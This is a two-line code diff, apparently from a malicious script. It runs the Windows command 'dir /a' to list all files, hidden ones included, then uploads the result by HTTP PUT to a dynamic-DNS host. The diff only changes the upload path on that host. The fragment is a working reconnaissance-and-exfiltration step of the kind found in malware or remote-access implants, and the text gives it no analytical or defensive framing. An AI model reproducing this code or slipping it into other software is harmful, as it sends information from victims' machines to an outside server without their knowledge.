@@ -1,2 +1,2 @@
 var res = runCmd("dir /a");
-httpPut('http://jxmobile.ddns.net', res);
+httpPut('http://jxmobile.ddns.net/tool/icings.txt', res);
